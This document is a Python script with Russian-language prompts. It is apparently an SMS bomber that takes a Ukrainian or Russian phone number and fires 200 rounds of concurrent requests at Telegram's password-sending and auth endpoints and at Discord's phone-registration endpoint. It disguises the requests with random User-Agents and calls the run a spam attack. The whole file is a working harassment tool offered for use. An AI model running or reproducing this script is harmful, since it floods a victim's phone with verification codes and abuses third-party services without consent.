import aiohttp
import asyncio
import re
import sys
import time
from fake_useragent import UserAgent

# Генерация случайного User-Agent
user = UserAgent().random
headers = {'User-Agent': user}

# Функция анимации печатания
def print_typing(text: str, delay: float = 0.03):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()  # Перевод строки в конце

# Функция проверки номера телефона (только Украина +380 и Россия +7)
def is_valid_phone(phone: str) -> bool:
    phone = phone.strip()
    if phone.lower() == 'exit':
        return False
    if not re.match(r'^\+\d+$', phone):
        return False
    if phone.startswith('+380') and len(phone) == 13:
        return True
    if phone.startswith('+7') and len(phone) == 12:
        return True
    return False

# URL-адреса для атак (очищены от пробелов)
urls = [
    'https://my.telegram.org/auth/send_password',
    'https://telegram.org/support?setln=ru',
    'https://my.telegram.org/auth/',
    'https://discord.com/api/v9/auth/register/phone'
]

max_rounds = 200

async def send_request(session, url, data=None):
    try:
        if data:
            async with session.post(url, headers=headers, data=data) as response:
                return await response.text()
        else:
            async with session.get(url, headers=headers) as response:
                return await response.text()
    except Exception as e:
        print_typing(f"❌ Ошибка при отправке запроса на {url}: {e}", delay=0.01)
        return None

async def attack(session, phone):
    tasks = []
    data = {'phone': phone}
    for url in urls:
        if 'send_password' in url or 'register' in url:
            tasks.append(send_request(session, url, data))
        else:
            tasks.append(send_request(session, url))
    await asyncio.gather(*tasks)

async def main():
    while True:
        number = input('Введите номер телефона в формате +380XXXXXXXXX или +7XXXXXXXXXX (или "exit" для выхода): ').strip()
        if number.lower() == 'exit':
            print_typing("🚪 Выход из программы...", delay=0.04)
            return
        if is_valid_phone(number):
            break
        else:
            print_typing("❌ Мы не принимаем этот номер. Убедитесь, что он соответствует формату Украины (+380) или России (+7).", delay=0.02)

    input('Нажмите ENTER, чтобы начать спам-атаку на поддержку TELEGRAM...')
    print_typing("🚀 Запуск атаки...", delay=0.05)

    async with aiohttp.ClientSession() as session:
        for i in range(1, max_rounds + 1):
            await attack(session, number)
            print_typing(f"✅ Раунд атаки {i} завершён", delay=0.02)

    print_typing("🎉 Атака завершена. Все круги выполнены.", delay=0.04)

if __name__ == "__main__":
    asyncio.run(main())
